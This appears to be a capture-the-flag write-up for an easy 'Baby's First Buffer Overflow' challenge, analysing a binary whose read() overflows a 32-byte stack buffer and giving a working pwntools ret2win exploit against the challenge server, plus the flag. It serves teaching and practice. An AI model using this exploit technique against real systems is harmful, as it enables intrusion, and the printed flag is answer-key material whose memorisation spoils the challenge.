# HASBLCTF Writeup: BAB

**CTF Name:** HASBLCTF  
**Category:** PWN  
**Challenge/Task Name:** Baby's First Buffer Overflow  
**Difficulty:** Easy  
**Author:** Phantom Blaze  
**Target:** `nc 34.77.68.154 10001`

## Objective
Exploit a classic buffer overflow vulnerability to redirect execution to a hidden `win()` function that reads and prints the flag.

## Solution / Walkthrough

### 1. Analyzing the Binary
The binary is a 64-bit ELF with the following security profile:
- **No PIE** (fixed addresses)
- **No Stack Canary**
- **NX enabled**

Key addresses extracted from the binary:
- `win()` → `0x401166`
- `main()` → `0x40131d`

### 2. Identifying the Vulnerability
The `main` function prints a message and reads user input:

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    puts("Baby shark doo-doo,doo-doo,doo-doo");
    void buf;
    read(0, &buf, 0x40);  // Reads 64 bytes into a 32-byte buffer
    return 0;
}
```

The disassembly reveals `sub rsp, 0x20` — allocating a **32-byte** stack buffer. However, `read()` accepts up to `0x40` (64) bytes, overflowing by 32 bytes past the buffer.

### 3. The Win Function
The `win()` function at `0x401166` opens, reads, and prints `flag.txt`:

```c
int64_t win()
{
    int32_t fd = open("flag.txt", 0);
    read(fd, &buf, 0x100);
    printf("[!!!!] %s\n", &buf);
    close(fd);
}
```

### 4. Calculating the Offset
| Stack Layout | Size |
|-------------|------|
| Buffer (`buf`) | 32 bytes (`0x20`) |
| Saved RBP | 8 bytes |
| **Return Address** | 8 bytes ← target |

**Offset to return address: 40 bytes** (32 + 8)

### 5. The Exploit
We also need a `ret` gadget (`0x401016`) before `win()` for 16-byte stack alignment on x86_64:

```python
from pwn import *

win_addr = 0x401166
ret_addr = 0x401016

r = remote('34.77.68.154', 10001)
r.recvline()  # "Baby shark doo-doo,doo-doo,doo-doo"

payload  = b'A' * 40           # Padding (32 buffer + 8 saved RBP)
payload += p64(ret_addr)       # Stack alignment gadget
payload += p64(win_addr)       # Return to win()

r.send(payload)
print(r.recvall().decode())
```

### 6. Retrieving the Flag
The payload overwrites the return address, causing `main()` to return into `win()`, which reads and prints the flag.

**Flag:**  
`HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}`
